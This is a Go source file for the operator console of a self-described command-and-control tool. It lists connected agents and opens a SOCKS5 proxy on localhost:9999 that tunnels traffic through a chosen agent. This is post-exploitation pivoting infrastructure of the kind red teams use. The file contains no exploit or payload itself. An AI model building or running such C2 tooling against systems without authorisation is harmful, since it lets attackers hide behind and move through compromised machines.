package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"go-cnc2/pkg/client"
	"go-cnc2/proto/pb"
	"os"
	"strconv"
	"strings"

	"github.com/google/uuid"
	logger "github.com/sirupsen/logrus"
	"google.golang.org/grpc"
)

type InteractiveClient struct {
	client      *client.Client
	proxyCancel context.CancelFunc
	proxyActive bool
}

func main() {
	serverAddr := flag.String("server", "", "Server")
	flag.Parse()

	if *serverAddr == "" {
		logger.Fatal("Please specify server address")
	}

	transportOption := grpc.WithInsecure()
	cc, err := grpc.Dial(*serverAddr, transportOption)
	if err != nil {
		logger.Errorf("cannot dial server: %v", err)
		return
	}
	defer cc.Close()

	myClient := client.NewClient(cc)
	interactive := &InteractiveClient{
		client:      myClient,
		proxyActive: false,
	}

	interactive.mainLoop()
}

func (ic *InteractiveClient) mainLoop() {
	scanner := bufio.NewScanner(os.Stdin)

	for {
		ic.showMenu()

		if !scanner.Scan() {
			break
		}

		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		switch input {
		case "1":
			ic.listAgents()
		case "2":
			ic.selectAgent()
		case "3":
			ic.stopProxy()
		case "4", "q", "quit", "exit":
			ic.stopProxy()
			fmt.Println("Goodbye!")
			return
		default:
			fmt.Println("Invalid option. Please try again.")
		}
	}
}

func (ic *InteractiveClient) showMenu() {
	fmt.Println("\n" + strings.Repeat("=", 50))
	fmt.Println("               C&C CLIENT MENU")
	fmt.Println(strings.Repeat("=", 50))
	fmt.Println("[1] List connected agents")
	fmt.Println("[2] Connect to agent (start SOCKS5 proxy)")
	if ic.proxyActive {
		fmt.Println("[3] Stop current proxy connection")
		fmt.Printf("    📡 PROXY ACTIVE on localhost:9999\n")
	} else {
		fmt.Println("[3] Stop proxy (no proxy active)")
	}
	fmt.Println("[4] Exit")
	fmt.Print("\nSelect option: ")
}

func (ic *InteractiveClient) listAgents() {
	fmt.Println("\nFetching connected agents...")

	resp, err := ic.client.GetAgents(context.Background(), &pb.Empty{})
	if err != nil {
		fmt.Printf("❌ Error getting agents: %v\n", err)
		return
	}

	if len(resp.Agents) == 0 {
		fmt.Println("❌ No agents connected")
		return
	}

	fmt.Printf("\n✅ Found %d connected agent(s):\n", len(resp.Agents))
	for i, agent := range resp.Agents {
		fmt.Printf("  [%d] %s\n", i, agent.Id)
	}
}

func (ic *InteractiveClient) selectAgent() {
	if ic.proxyActive {
		fmt.Println("❌ Proxy is already active. Stop current proxy first.")
		return
	}

	resp, err := ic.client.GetAgents(context.Background(), &pb.Empty{})
	if err != nil {
		fmt.Printf("❌ Error getting agents: %v\n", err)
		return
	}

	if len(resp.Agents) == 0 {
		fmt.Println("❌ No agents connected")
		return
	}

	fmt.Printf("\nAvailable agents:\n")
	for i, agent := range resp.Agents {
		fmt.Printf("  [%d] %s\n", i, agent.Id)
	}

	fmt.Print("Select agent number: ")
	scanner := bufio.NewScanner(os.Stdin)
	if !scanner.Scan() {
		return
	}

	input := strings.TrimSpace(scanner.Text())
	n, err := strconv.Atoi(input)
	if err != nil || n < 0 || n >= len(resp.Agents) {
		fmt.Println("❌ Invalid agent number")
		return
	}

	agentId, err := uuid.Parse(resp.Agents[n].Id)
	if err != nil {
		fmt.Printf("❌ Error parsing agent ID: %v\n", err)
		return
	}

	ic.startProxy(agentId)
}

func (ic *InteractiveClient) startProxy(agentId uuid.UUID) {
	ctx, cancel := context.WithCancel(context.Background())
	ic.proxyCancel = cancel
	ic.proxyActive = true

	fmt.Printf("🚀 Starting SOCKS5 proxy on localhost:9999 via agent: %s\n", agentId.String())
	fmt.Println("   You can now configure applications to use SOCKS5 proxy: localhost:9999")
	fmt.Println("   Return to this menu to stop the proxy or select a different agent")

	go func() {
		defer func() {
			ic.proxyActive = false
			ic.proxyCancel = nil
		}()

		ic.client.Socks5ProxyStartWithContext(ctx, agentId)
		fmt.Println("\n🛑 SOCKS5 proxy stopped")
	}()
}

func (ic *InteractiveClient) stopProxy() {
	if !ic.proxyActive {
		fmt.Println("ℹ️  No proxy is currently active")
		return
	}

	if ic.proxyCancel != nil {
		ic.proxyCancel()
		fmt.Println("🛑 Stopping SOCKS5 proxy...")
	}
}
